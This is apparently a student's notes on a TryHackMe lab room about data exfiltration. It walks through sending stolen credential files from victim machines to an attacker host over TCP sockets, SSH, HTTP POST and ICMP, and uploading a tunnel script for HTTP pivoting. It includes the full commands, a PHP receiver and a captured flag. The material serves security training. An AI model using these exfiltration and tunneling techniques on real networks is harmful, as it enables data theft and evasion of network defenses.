# Introduction
---

Welcome to Data Exfiltration  

Cybercriminals use various internet attacks against companies for different purposes. In most cases, many of these attacks end in data breaches, where threat actors steal sensitive data to sell it on the dark web or publish it online.

Someone may ask: how does a threat actor transfer stolen data from a company's network to the outside, also known as a data breach, without being detected? The answer varies. There are many techniques that a threat actor can perform, including data exfiltration.Â 

Data exfiltration is a non-traditional approach for copying and transferring data from a compromised to an attacker's machine. The data exfiltration technique is used to emulate the normal network activities, andÂ It relies on network protocols such asÂ DNS,Â HTTP,Â SSH, etc.Â Data Exfiltration over common protocols is challenging to detect and distinguish between legitimate and malicious traffic.

Some protocols are not designed to carry data over them. However, threat actors find ways to abuse these protocols to bypass network-based security products such as aÂ firewall.Â Using these techniques as a red teamer is essential to avoid being detected.

Learning Objectives

This room introduces the data exfiltration types and showcases the techniques used to transfer data over various protocols.  

- What is Data exfiltration?
- Understand data exfiltration types and how they can be used.  
- Practice data exfiltration over protocols: Sockets,Â SSH, ICMP,Â HTTP(s), andÂ DNS.
- PracticeÂ C2Â communications over various protocols.
- Practice establishing Tunneling overÂ DNSÂ andÂ HTTP.

Room Prerequisites

- [Introductory Networking](https://tryhackme.com/room/introtonetworking)  
- [Protocols and Servers](https://tryhackme.com/room/protocolsandservers)  
- [DNSÂ in Detail](https://tryhackme.com/room/dnsindetail)
- Using tmux or similar tools! (for multiple sessions on singleÂ SSHÂ login)


# Network Infrastructure
---

For this room, we have built a network to simulate practical scenarios where we can perform data exfiltration and tunneling using various network protocols. The providedÂ VMÂ contains two separated networks with multiple clients. We also have a "**JumpBox**" machine that accessesÂ **both networks**. The following diagram shows more information about the network environment used in this room.  

![Network Infrastructure](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/224e0380ac936c602fe41c6537ed4565.png)  

Use the network diagram for your reference during the coming tasks for various protocols. We also set up a domain name,Â thm.com, to make it easier to communicate and connect within the network environment. Check the following table for more information about the domain names and network access used in this room.

|   |   |   |
|---|---|---|
|**Domain Name**|**IP Address**|**Network Access**|
|jump.thm.com|192.168.0.133|Net 1 and Net 2|
|uploader.thm.com|172.20.0.100|Net 1|
|flag.thm.com|*****.**.*.*****|Net 1|
|victim2.thm.com|172.20.0.101|Net 1|
|web.thm.com|192.168.0.100|Net 2|
|icmp.thm.com|192.168.0.121|Net 2|
|victim1.thm.com|192.168.0.101|Net 2|


Machine IP:Â MACHINE_IPÂ Â  Â  Â  Â  Â  Â Username:Â thmÂ Â  Â  Â  Â Â Password:Â tryhackmeÂ 


```markup
root@AttackBox$ ssh thm@MACHINE_IP 
```

Once you are connected to theÂ JumpboxÂ machine, you have access to both networks. Check the network infrastructure for more information.

Lab Recommendation

- We recommend using theÂ **JumpBox**Â and the network environment for most tasks (TCP,Â SSH, ICMP,Â DNS) to avoid technical issues withÂ DNSÂ and networking. However, If you prefer to use the AttackBox for theÂ DNSÂ Tunneling task (task 10), you must change theÂ DNSÂ settings of the AttackBox toÂ MACHINE_IP. For more information about changing theÂ DNSÂ for AttackBox, check theÂ DNSÂ configuration (Task 8).Â 

- In most cases, we need to use two machines to establish communication. Thus, we need two or moreÂ LinuxÂ terminals available to complete the task. Therefore, we recommend using theÂ tmuxÂ tool for creating multiple sessions over a singleÂ SSHÂ login.


# Data Exfiltration
---

## What is Data Exfiltration

Data Exfiltration is the process of taking an unauthorized copy of sensitive data and moving it from the inside of an organization's network to the outside. It is important to note that Data Exfiltration is a post-compromised process where a threat actor has already gained access to a network and performed various activities to get hands on sensitive data. Data Exfiltration oftenÂ happens at the last stage of the Cyber Kill Chain model, Actions on Objectives.

![Cyber Kill Chain](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/5ed5961c6276df568891c3ea-1721309536895.png)  

Data exfiltration is also used to hide an adversary's malicious activities and bypass security products. For example, theÂ DNSÂ exfiltration technique can evade security products, such as aÂ firewall.  

Sensitive data can be in various types and forms, and it may contain the following:

- Usernames and passwords or any authentication information.
- Bank accounts details
- Business strategic decisions.
- Cryptographic keys.
- Employee and personnel information.
- Project code data.

## How to use Data Exfiltration

There are three primaryÂ use case scenarios of data exfiltration, including:

1. Exfiltrate data
2. Command and control communications.
3. Tunneling

### **Traditional Data Exfiltration**

![Traditional Data Exifltration](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/0c3438995ccff35a5589b9abd3703b14.png)

The traditional Data Exfiltration scenario is moving sensitive data out of the organization's network. An attacker can make one or more network requests to transfer the data, depending on the data size and the protocolÂ used. Note that a threat actor does not care about the reply or response to his request. Thus, all traffic will be in one direction, from inside the network to outside. Once the data is stored on the attacker's server, he logs into it and grabs the data.

### **C2Â Communications**

![C2 Communications](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/49ad248f2506a5a749dbb70732c32072.png)

ManyÂ C2Â frameworks provide options to establish a communication channel, including standard and non-traditional protocols to send commands and receive responses from a victim machine. InÂ C2Â communications a limited number of requests where an attacker sends a request to execute a command in the victim's machine. Then, the agent's client executes the command and sends a reply with the result over a non-traditional protocol. The communications will go in two directions: into and out of the network.

### **Tunneling**

![Tunneling communication](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/b4c99b2aba13eac24379fee2d20ffbf6.png)  

In the Tunneling scenario, an attacker uses this data exfiltration technique to establish a communication channel between a victim and an attacker's machine. The communication channel acts as a bridge to let the attacker machine access the entire internal network. There will be continuous traffic sent and received while establishing the connection.

In the coming tasks, we will discuss the following techniques and use cases:

- Exfiltrate usingÂ TCPÂ socket and Base64
- Exfiltrate usingÂ SSH
- Exfiltrate using HTTPS (POST request)
- ICMP
- DNS


![Pasted image 20250516174541.png](../../../IMAGES/Pasted%20image%2020250516174541.png)

# Exfiltration using TCP socket
----

This task shows how to exfiltrate data overÂ TCPÂ using data encoding.Â Using theÂ TCPÂ socket is one of the data exfiltration techniques that an attacker may use inÂ a non-secured environment where they know there are no network-based security products.Â If we are in a well-secured environment, then this kind of exfiltration is not recommended.Â This exfiltration type is easy to detect because we rely on non-standard protocols.

Besides theÂ TCPÂ socket, we will also use various other techniques, including data encoding and archiving. One of the benefits of this technique is that it encodes the data during transmission and makes it harder to examine.

The following diagram explains how traditional communications overÂ TCPÂ work. If two machines want to communicate, then one of them has to listen and wait for the incoming traffic. It is similar to how two people talk and communicate, where one of them is listening, and the other person is speaking.Â 

![Connection over TCP/port](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/9931b598f5757bbdfb74004a2a43fe16.png)  

The diagram shows that two hosts communicate overÂ TCPÂ on port 1337 in the following steps:

1. The first machine is listening overÂ TCPÂ on portÂ **1337**
2. The other machine connects to the port specified in step 1. For example,Â **nc 1.2.3.4 1337**
3. The first machine establishes the connection
4. Finally, the sending and receiving data starts. For example, the attacker sends commands and receives results.

Communication overÂ TCPÂ requires two machines, one victim and one attacker machine, to transfer data. Let's use our network environment to practice sending data overÂ TCP. To establish communication overÂ TCP, we require two machines: theÂ victim1.thm.comÂ machine is the victimÂ and the JumpBox,Â jump.thm.com,Â is the attacker's machine.

First, we need to prepare a listener on theÂ **JumpBox**Â on a port you specify. In our case, we chooseÂ portÂ 8080.  

Listening on portTCP/8080 in the JumpBox  

```markup
thm@jump-box$ nc -lvp 8080 > /tmp/task4-creds.data
Listening on [0.0.0.0] (family 0, port 8080)
```

From the previous command, we used theÂ ncÂ command to receive data on portÂ 8080. Then, once we receive the data, we store it in theÂ /tmp/Â directory and call itÂ task4-creds.dataÂ as a filename.

Now let's connect to our victim machine that contains the data that needs to be transmitted using the following credential:Â thm:tryhackme. Note thatÂ to connect to theÂ victim1Â from the JumpBox, we can use the internal domain name as follows,


```markup
thm@jump-box$ ssh thm@victim1.thm.com
```

We can also connect directly from the AttackBox using portÂ 2022Â as follows,

```markup
root@AttackBox$ ssh thm@10.10.39.16 -p 2022
```

We have the required data ready to be transmitted on the victim machine. In this case, we have a sample file with a couple of credentials.

Checking the creds.txt file on the victim machine  

```markup
thm@victim1:~$ cat task4/creds.txt
admin:password
Admin:123456
root:toor
```

Now that we have the credential text file, we will use theÂ TCPÂ socket to exfiltrate it.Â **Make sure the listener is running on the JumpBox**.

Exfiltrate Data overTCPSocket from the victim machine!  

```markup
thm@victim1:$ tar zcf - task4/ | base64 | dd conv=ebcdic > /dev/tcp/192.168.0.133/8080
0+1 records in
0+1 records out
260 bytes copied, 9.8717e-05 s, 2.6 MB/s
```

Let's break down the previous commandÂ and explain it:

1. We used theÂ tarÂ command to create an archive file with theÂ zcfÂ arguments of the content of the secret directory.
2. TheÂ zÂ isÂ for using gzip to compress the selected folder, theÂ cÂ is for creating a new archive, and theÂ fÂ is forÂ using an archive file.
3. We then passed the created tar file to the base64 command for converting it to base64 representation.
4. Then, we passed the result of the base64 command to create and copy a backup file with theÂ ddÂ command using EBCDIC encoding data.
5. Finally, we redirect theÂ ddÂ command's output to transfer it using theÂ TCPÂ socket on the specified IP and port, which in this case, portÂ 8080.

Note that we used the Base64 and EBCDIC encoding to protect the data during the exfiltration. If someone inspects the traffic, it would be in a non-human readable format and wouldn't reveal the transmitted file type.

Once we hit enter, we should receive the encoded data in theÂ /tmp/Â directory.

Checking the received data on the JumpBoxÂ   

```markup
thm@jump-box$ nc -lvp 8080 > /tmp/task4-creds.data
Listening on [0.0.0.0] (family 0, port 8080)
Connection from 192.168.0.101 received!

thm@jump-box$ ls -l /tmp/
-rw-r--r-- 1 root root       240 Apr  8 11:37 task4-creds.data
```

On the JumpBox, we need to convert the received data back to its original status. We will be using theÂ ddÂ tool to convert it back.Â 

Restoring the tar file  

```markup
thm@jump-box$ cd /tmp/
thm@jump-box:/tmp/$ dd conv=ascii if=task4-creds.data |base64 -d > task4-creds.tar
0+1 records in
0+1 records out
260 bytes transferred in 0.000321 secs (810192 bytes/sec)
```

The following is the explanation of the previous command:

1. We used theÂ ddÂ command to convert the received file toÂ ASCIIÂ Â representation. We used theÂ task4-creds.dataÂ as input to theÂ ddÂ command.Â 
2. The output of theÂ ddÂ command will be passed to the base64 to decode it using theÂ -dÂ argument.
3. Finally, we save the output in theÂ task4-creds.tarÂ Â file.

Next, we need to use theÂ tarÂ command to unarchive theÂ task4-creds.tarÂ file and check the content as follows,

Uncompressing the tar file  

```markup
thm@jump-box$ tar xvf task4-creds.tar
task4/ 
task4/creds.txt
```

Let's break down the previous commandÂ and explain it:

1. We used theÂ tarÂ command to unarchive the file with theÂ xvfÂ arguments.
2. TheÂ xÂ isÂ for extracting the tar file, theÂ vÂ for verbosely listing files, and theÂ fÂ is forÂ using an archive file.

Now let's confirm that we have the same data from the victim machine.

Confirming the received data  

```markup
thm@jump-box$ cat task4/creds.txt
admin:password
Admin:123456
root:toor
```

Success! We exfiltrated data from a victim machine to an attacker machine using theÂ TCPÂ socket in this task.


![Pasted image 20250516175048.png](../../../IMAGES/Pasted%20image%2020250516175048.png)


# Exfiltration using SSH
---

In this task we will showÂ how to useÂ SSHÂ protocol to exfiltrate data over to an attacking machine.Â SSHÂ protocol establishes a secure channel to interact and move data between the client and server, so all transmission data is encrypted over the network or the Internet.

![Encrypted SSH communication channel](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/aa723bb0e2c39dfc936b135c4912d1cf.png)  

To transfer data over theÂ SSH, we can use either the Secure Copy ProtocolÂ SCPÂ or theÂ SSHÂ client. Let's assume that we don't have theÂ SCPÂ command available to transfer data overÂ SSH. Thus, we will focus more on theÂ SSHÂ client in this task.  

As we mentioned earlier, an attacker needs to control a server, which in this case has anÂ SSHÂ server enabled, to receive the exfiltrated data. Thus, we will be using the AttackBox as ourÂ SSHÂ server in this scenario. You can also use the JumpBox since it has anÂ SSHÂ server enabled.  

Let's assume that we have gained access to sensitive data that must be transmitted securely. Â Let's connect to theÂ victim1Â orÂ victim2Â machine.

The data that needs to be transferred  

```markup
thm@victim1:~$ cat task5/creds.txt
admin:password
Admin:123456
root:toor
```

Let's use the same technique we discussed in the "exfiltration using aÂ TCPÂ socket" task, where we will be using the tar command to archive the data and then transfer it.

Exfiltration data from the victim1 machine  

```markup
thm@victim1:$ tar cf - task5/ | ssh thm@jump.thm.com "cd /tmp/; tar xpf -"
```

Let's break down the previous commandÂ and explain it:  

1. We used theÂ tarÂ command the same as the previous task to create an archive file of theÂ task5Â directory.
2. Then we passed the archived file over theÂ ssh.Â SSHÂ clients provide a way to execute a single command without having a full session.
3. We passed the command that must be executed in double quotations,Â "cdÂ /tmp/; tar xpf. In this case, we change the directory and unarchive the passed file.

If we check the attacker machine, we can see that we have successfully transmitted the file.

Checking the received data  

```markup
thm@jump-box$ cd /tmp/task5/
thm@jump-box:/tmp/task5$ cat creds.txt
admin:password
Admin:123456
root:toor
```

# Exfiltrate using HTTP(S)
---

Before going further, ensure that you have the fundamental knowledge of network protocols before diving into this task and the upcoming tasks.

This task explains how to use theÂ HTTP/HTTPS protocol to exfiltrate data from a victim to an attacker's machine. As a requirement for this technique, an attacker needs control over a webserver with a server-side programming language installed and enabled. We will show aÂ PHP-based scenario in this task, but it can be implemented in any other programming language, such as python, Golang, NodeJS, etc.  

## HTTPÂ POST Request

Exfiltration data through theÂ HTTPÂ protocol is one of the best options because it is challenging to detect. It is tough to distinguish between legitimate and maliciousÂ HTTPÂ traffic. We will use the POSTÂ HTTPÂ method in the data exfiltration, and the reason is with the GET request, all parameters are registered into the log file. While using POST request, it doesn't. The following are some of the POST method benefits:

- POST requests are never cached
- POST requests do not remain in the browser history
- POST requests cannot be bookmarked
- POST requests have no restrictions onÂ **data length**

Let's login to theweb.thm.comÂ machine usingÂ thm:tryhackmeÂ credentials and inspect theÂ ApacheÂ log file with twoÂ HTTPÂ requests, one for the GET and the other for the POST, and check what they look like!

Inspecting theApachelog file  

```markup
thm@jump-box:~$ ssh thm@web.thm.com
thm@web-thm:~$ sudo cat /var/log/apache2/access.log
[sudo] password for thm:
10.10.198.13 - - [22/Apr/2022:12:03:11 +0100] "GET /example.php?file=dGhtOnRyeWhhY2ttZQo= HTTP/1.1" 200 147 "-" "curl/7.68.0"
10.10.198.13 - - [22/Apr/2022:12:03:25 +0100] "POST /example.php HTTP/1.1" 200 147 "-" "curl/7.68.0"
```

Obviously, the first line is a GET request with a fileÂ parameter with exfiltrated data. If you try to decode it using the based64 encoding, you would get the transmitted data, which in this case isÂ thm:tryhackme.Â While the second request is a POST toÂ example.php, we sent the same base64 data, but it doesn't show what data was transmitted.

The base64 data in your access.log looks different, doesn't it? Decode it to find the Flag for Question 1 below.  

In a typical real-world scenario, an attacker controls a web server in the cloud somewhere on the Internet. An agent or command is executed from a compromised machine to send the data outside the compromised machine's network over the Internet into the webserver. Then an attacker can log in to a web server to get the data, as shown in the following figure.  

![Typical HTTP Data Exifltration](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/789a9a13d9977b11d11f53bb7dbb9f3a.png)  

## HTTPÂ Data Exfiltration

Based on the attacker configuration, we can set up eitherÂ HTTPÂ or HTTPS, the encrypted version ofÂ HTTP. We also need aÂ PHPÂ page that handles the POSTÂ HTTPÂ request sent to the server.

We will be using theÂ HTTPÂ protocol (not the HTTPS) in our scenario. Now let's assume that an attacker controls theÂ web.thm.comÂ server, and sensitive data must be sent from the JumpBox orÂ Â victim1.thm.comÂ machine in our Network 2 environment (192.168.0.0/24).Â Â 

To exfiltrate data over theÂ HTTPÂ protocol, we can apply the following steps:

1. An attacker sets up a web server with a data handler. In our case, it will beÂ web.thm.comÂ and theÂ contact.phpÂ page as a data handler.
2. AÂ C2Â agent or an attacker sends the data. In our case, we will send data using theÂ curlÂ command.
3. The webserver receives the data and stores it. In our case, theÂ contact.phpÂ receives the POST request and stores it intoÂ /tmp.
4. The attacker logs into the webserver to have a copy of the received data.

Let's follow and apply what we discussed in the previous steps. Remember, since we are using theÂ HTTPÂ protocol, the data will be sent in cleartext. However, we will be using other techniques (tar and base64) to change the data's string format so that it wouldn't be in a human-readable format!

First, we prepared a webserver with a data handler for this task. The following code snapshot is ofÂ PHPÂ code to handle POST requests via aÂ fileÂ parameter and stores the received data in theÂ /tmpÂ directory asÂ http.bs64Â file name.

```php
<?php 
if (isset($_POST['file'])) {
        $file = fopen("/tmp/http.bs64","w");
        fwrite($file, $_POST['file']);
        fclose($file);
   }
?>
```

Now from theÂ **Jump**Â machine, connect to theÂ victim1.thm.comÂ machine viaÂ SSHÂ to exfiltrate the required data over theÂ HTTPÂ protocol. Use the followingÂ SSHÂ credentials:Â thm:tryhackme.

Connecting to Victim1 machine from Jump Box  

```markup
thm@jump-box:~$ ssh thm@victim1.thm.com
```

You can also connect to it from AttackBox using portÂ 2022Â as follow,

Connecting to Victim1 machine from AttackBox  

```markup
thm@attacker$ ssh thm@10.10.39.16 -p 2022
```

The goal is to transfer the folder's content, stored inÂ /home/thm/task6,Â to another machine over theÂ HTTPÂ protocol.

Checking the Secret folder!  

```markup
thm@victim1:~$ ls -l
total 12
drwxr-xr-x 1 root root 4096 Jun 19 19:44 task4
drwxr-xr-x 1 root root 4096 Jun 19 19:44 task5
drwxr-xr-x 1 root root 4096 Jun 19 19:44 task6
drwxr-xr-x 1 root root 4096 Jun 19 19:43 task9
```

Now that we have our data, we will be using theÂ curlÂ command to send anÂ HTTPÂ POST request with the content of the secret folder as follows,

Sending POST data via CURL  

```markup
thm@victim1:~$ curl --data "file=$(tar zcf - task6 | base64)" http://web.thm.com/contact.php
```

We used theÂ curlÂ command withÂ --dataÂ argument to send a POST request via theÂ fileÂ parameter. Note that we created an archived file of the secret folder using theÂ tarÂ command. We also converted the output of theÂ tarÂ command into base64 representation.

Next, from theÂ **victim1 or JumpBox**Â machine, let's log in to the webserver,Â web.thm.com,Â and check theÂ /tmpÂ directory if we have successfully transferred the required data. Use the followingÂ SSHÂ credentials in order to login into the web:Â thm:tryhackme.

Checking the received data  

```markup
thm@victim1:~$ ssh thm@web.thm.com 
thm@web:~$ ls -l /tmp/
total 4
-rw-r--r-- 1 www-data www-data 247 Apr 12 16:03 http.bs64
thm@web:~$ cat /tmp/http.bs64
H4sIAAAAAAAAA 3ROw7CMBBFUddZhVcA/sYSHUuJSAoKMLKNYPkkgSriU1kIcU/hGcsuZvTysEtD<
WYua1Ch4P9fRss69dsZ4E6wNTiitlTdC qpTPZxz6ZKUIsVY3v379P6j8j3/8ejzqlyrrDgF3Dr3
On/XLvI3QVshVY1hlv48/64/7I bU5fzJaa 2c5XbazzbTOtvCkxpubbUwIAAAAAAAAAAAAAAAB4
5gZKZxgrACgAAA==
```

Nice! We have received the data, but if you look closely at theÂ http.bs64Â file, you can see it is broken base64. This happens due to the URL encoding over theÂ HTTP. TheÂ +Â symbol has been replaced with empty spaces, so let's fix it using theÂ sedÂ command as follows,

Fixing thehttp.bs64 file!  

```markup
thm@web:~$ sudo sed -i 's/ /+/g' /tmp/http.bs64
```

Using theÂ sedÂ command, we replaced the spaces withÂ +Â characters to make it a valid base64 string!

Restoring the Data

```markup
thm@web:~$ cat /tmp/http.bs64 | base64 -d | tar xvfz -
tmp/task6/
tmp/task6/creds.txt
```

Finally, we decoded the base64 string using theÂ base64Â command withÂ -dÂ argument, then we passed the decoded file andÂ unarchivedÂ it using theÂ tarÂ command.

## HTTPS Communications

In the previous section, we showed how to perform Data Exfiltration over theÂ HTTPÂ protocol which means all transmitted data is in cleartext. One of the benefits of HTTPS is encrypting the transmitted data using SSL keys stored on a server.

If you apply the same technique we showed previously on a web server with SSL enabled, then we can see that all transmitted data will be encrypted. We have set up our private HTTPS server to show what the transmitted data looks like. If you are interested in setting up your own HTTPS server, we suggest visiting theÂ [Digital Ocean website](https://www.digitalocean.com/community/tutorials/how-to-create-a-self-signed-ssl-certificate-for-apache-in-ubuntu-18-04).  

![HTTPS traffic in Wireshark](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/fbf6c90063102ca100ba8d544ba9d7f8.png)  

As shown in the screenshot, we captured the network traffic and it seems that all client and server communications on portÂ 443Â are encrypted.

## HTTPÂ Tunneling

Tunneling over theÂ HTTPÂ protocol technique encapsulates other protocols and sends them back and forth via theÂ HTTPÂ protocol.Â HTTPÂ tunneling sends and receives manyÂ HTTPÂ requests depending on the communication channel!

Before diving intoÂ HTTPÂ tunneling details, let's discuss a typical scenario where many internal computers are not reachable from the Internet. For example, in our scenario, theÂ uploader.thm.comÂ server is reachable from the Internet and provides web services to everyone. However, theÂ app.thm.comÂ server runs locally and provides services only for the internal network as shown in the following figure:Â   

![HTTP Tunneling](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/92004a7c6a572f9680f0056b9aa88baa.png)

In this section, we will create anÂ HTTPÂ tunnel communication channel to pivot into the internal network and communicate with local network devices throughÂ HTTPÂ protocol. Let's say that we found a web application that lets us upload anÂ HTTPÂ tunnel agent file to a victim webserver,Â uploader.thm.com.Â Once we upload and connect to it,Â we will be able to communicate withÂ app.thm.com.Â 

ForÂ HTTPÂ Tunneling, we will be using aÂ [Neo-reGeorg](https://github.com/L-codes/Neo-reGeorg)Â tool to establish a communication channel to access the internal network devices. We have installed the tool in AttackBox, and it can be found in the following location:

Neo-reGeorg Path on AttackBox  

```markup
root@AttackBox:/opt/Neo-reGeorg#
```

Next, we need to generate an encrypted client file to upload it to the victim web server as follows,

Generating encrypted Tunneling Clients with a selected password!  

```markup
root@AttackBox:/opt/Neo-reGeorg# python3 neoreg.py generate -k thm                                                                                                                                                                              


          "$$$$$$''  'M$  '$$$@m
        :$$$$$$$$$$$$$$''$$$$'
       '$'    'JZI'$$&  $$$$'
                 '$$$  '$$$$
                 $$$$  J$$$$'
                m$$$$  $$$$,
                $$$$@  '$$$$_          Neo-reGeorg
             '1t$$$$' '$$$$<
          '$$$$$$$$$$'  $$$$          version 3.8.0
               '@$$$$'  $$$$'
                '$$$$  '$$$@
             'z$$$$$$  @$$$
                r$$$   $$|
                '$$v c$$
               '$$v $$v$$$$$$$$$#
               $$x$$$$$$$$$twelve$$$@$'
             @$$$@L '    '<@$$$$$$$$`
           $$                 '$$$


    [ Github ] https://github.com/L-codes/neoreg

    [+] Mkdir a directory: neoreg_servers
    [+] Create neoreg server files:
       => neoreg_servers/tunnel.aspx
       => neoreg_servers/tunnel.ashx
       => neoreg_servers/tunnel.jsp
       => neoreg_servers/tunnel_compatibility.jsp
       => neoreg_servers/tunnel.jspx
       => neoreg_servers/tunnel_compatibility.jspx
       => neoreg_servers/tunnel.php
```

The previous command generates encrypted Tunneling clients withÂ thmÂ key in theÂ neoreg_servers/Â directory. Note that there are various extensions available, includingÂ PHP, ASPX, JSP, etc. In our scenario, we will be uploading theÂ tunnel.phpÂ file via the uploader machine. To access the uploader machine, you can visitÂ the following URL:Â http://10.10.39.16/uploaderÂ orÂ https://10-10-39-16.p.thmlabs.com/uploaderÂ without the need for aÂ VPN.

![The Victim's uploader](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/2445ab5b8bc971b51f8ebe3ffbd0c07d.png)

To upload theÂ PHPÂ file, useÂ adminÂ as the key to let you upload any files into theÂ uploader.thm.com. Once we have uploaded the file, we can access it on the following URL:Â http://10.10.39.16/uploader/files/tunnel.php.

Creating an HTTPTunnel  

```markup
root@AttackBox:/opt/Neo-reGeorg# python3 neoreg.py -k thm -u http://10.10.39.16/uploader/files/tunnel.php
```

We need to use theÂ neoreg.pyÂ to connect to the client and provide the key to decrypt the tunneling client. We also need to provide a URL to theÂ PHPÂ file that we uploaded on the uploader machine.

Once it is connected to the tunneling client, we are ready to use the tunnel connection as aÂ proxyÂ binds on our local machine,Â 127.0.0.1,Â on port 1080.

For example, if we want to access theÂ app.thm.com, which has an internal IP addressÂ 172.20.0.121Â on port 80, we can use the curl command withÂ --socks5Â argument. We can also use otherÂ proxyÂ applications, such as ProxyChains, FoxyProxy, etc., to communicate with the internal network.Â 

Access the app.thm.com machine via theHTTPTunneling  

```markup
root@AttackBox:~$ curl --socks5 127.0.0.1:1080 http://172.20.0.121:80
Welcome to APP Server!
```

The following diagram shows the traffic flow as it goes through the uploader machine and then communicates with the internal network devices, which in this case, is the App machine. Note that if we check the network traffic from the App machine, we see that the source IP address of incoming traffic comes from the uploader machine.

![HTTP Tunneling diagram](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/b32d6d9d9c3377acf155044204ec6982.png)  

Now replicate theÂ HTTPÂ Tunneling steps to establish tunneling over theÂ HTTPÂ protocol to communicate withÂ flag.thm.comÂ withÂ 172.20.0.120Â asÂ an IP address on portÂ 80. Note that if you access theÂ flag.thm.comÂ website from other machines within the network, you won't get the flag.

### Getting the flag

We need to use `Neo-reGeorg`:

```
python3 neoreg.py generate -k thm
```

Once we generated the files, we need to go to:

```
http://IP/uploader
```

On here, we need to upload our `tunnel.php` file the tool generated:

![Pasted image 20250516180630.png](../../../IMAGES/Pasted%20image%2020250516180630.png)

Once we upload it, we will get that message, now, we can use the tool again:

```
python3 neoreg.py -k thm -u http://10.10.39.16/uploader/files/tunnel.php


          "$$$$$$''  'M$  '$$$@m
        :$$$$$$$$$$$$$$''$$$$'
       '$'    'JZI'$$&  $$$$'
                 '$$$  '$$$$
                 $$$$  J$$$$'
                m$$$$  $$$$,
                $$$$@  '$$$$_          Neo-reGeorg
             '1t$$$$' '$$$$<
          '$$$$$$$$$$'  $$$$          version 5.2.1
               '@$$$$'  $$$$'
                '$$$$  '$$$@
             'z$$$$$$  @$$$
                r$$$   $$|
                '$$v c$$
               '$$v $$v$$$$$$$$$#
               $$x$$$$$$$$$twelve$$$@$'
             @$$$@L '    '<@$$$$$$$$`
           $$                 '$$$


    [ Github ] https://github.com/L-codes/Neo-reGeorg

+------------------------------------------------------------------------+
  Log Level set to [ERROR]
  Starting SOCKS5 server [127.0.0.1:1080]
  Tunnel at:
    http://10.10.39.16/uploader/files/tunnel.php
```

In order to access our flag, we can use curl:

```
curl --socks5 127.0.0.1:1080 http://172.20.0.120/flag
<p>Your flag: THM{H77p_7unn3l1n9_l1k3_l337}</p>%
```

Nice, our flag is:

```
THM{H77p_7unn3l1n9_l1k3_l337}
```

# Exfiltration using ICMP
---

In this task, we will be showing how to exfiltrate data using the ICMP protocol. ICMP stands forÂ **I**nternetÂ **C**ontrolÂ **M**essageÂ **P**rotocol, and it is a network layer protocol used to handle error reporting. If you need more information about ICMP and the fundamentals of computer networking, you may visit the followingÂ THMÂ room:Â [What is Networking](https://tryhackme.com/room/whatisnetworking).Â 

Network devices such as routers useÂ ICMPÂ protocol to check network connectivities between devices. Note that the ICMP protocol is not a transport protocol to send data between devices.Â Let's say that two hosts need to test the connectivity in the network; then, we can use theÂ pingÂ command to sendÂ ICMPÂ packets through the network, as shown in the following figure.

![ICMP Request and Reply](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/2a65a034de59c6e603a5a5f61fd7d909.png)  

TheÂ HOST1Â sends an ICMP packet with anÂ **echo-request**Â packet. Then, ifÂ HOST2Â is available, it sendsÂ anÂ ICMPÂ packet backÂ with anÂ **echo reply**Â message confirming the availability.

## ICMP Data Section  

On a high level, theÂ ICMPÂ packet's structure contains aÂ DataÂ section that can include strings or copies of other information, such as the IPv4 header, used for error messages. The following diagram shows theÂ DataÂ section, which is optional to use.

![ICMP Packet Structure](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/38e7df5e059ece4c2567bd7f77421b22.png)

Note that the Data field is optional and could either be empty or it could contain a random string during the communications.Â As an attacker, we can use the ICMP structure to include our data within theÂ DataÂ section and send it viaÂ ICMPÂ packet to another machine. The other machine must capture the network traffic with the ICMP packets to receive the data.

To perform manual ICMP data exfiltration, we need to discussÂ theÂ pingÂ command aÂ bit more. TheÂ pingÂ command is a network administrator software available in any operating system. It is used to check the reachability andÂ availabilityÂ by sendingÂ ICMPÂ packets, which can be used as follows:

Sending one ICMP packet using the PING Command  

```markup
thm@AttackBox$ ping 10.10.39.16 -c 1
```

We choose to send one ICMP packet from Host 1, our AttackBox, to Host 2, the target machine, using the-c 1Â argument from the previous command. Now let's examine the ICMP packet in Wireshark and see what the Data section looks like.  

![Showing the Data Field value in Wireshark](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/3e8367a535e3f7f4076986987b9e0dcd.png)

The Wireshark screenshot shows that the Data section has been selected with random strings. It is important to note that this section could be filled with the data that needs to be transferred to another machine.Â 

The ping command in theÂ LinuxÂ OSÂ has an interesting ICMP option. With theÂ -pÂ argument, we can specify 16 bytes of data in hex representation to send through the packet.Â Note that theÂ -pÂ option is only available forÂ LinuxÂ operating systems.Â We can confirm that by checking the ping's help manual page.

![Ping's -p argument](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/61d50ec683ddae6c2f52f532cc02f685.png)  

Let's say that we need to exfiltrate the following credentialsÂ thm:tryhackme. First, we need to convert it to its Hex representation and then pass it to theÂ pingÂ command usingÂ -pÂ options as follows,

Using the xxd command to convert text to Hex  

```markup
root@AttackBox$ echo "thm:tryhackme" | xxd -p 
74686d3a7472796861636b6d650a
```

We used theÂ xxdÂ command to convert our string to Hex, and then we can use theÂ pingÂ command with the Hex value we got from converting theÂ thm:tryhackme.

Send Hex using the ping command.  

```markup
root@AttackBox$ ping 10.10.39.16 -c 1 -p 74686d3a7472796861636b6d650a
```

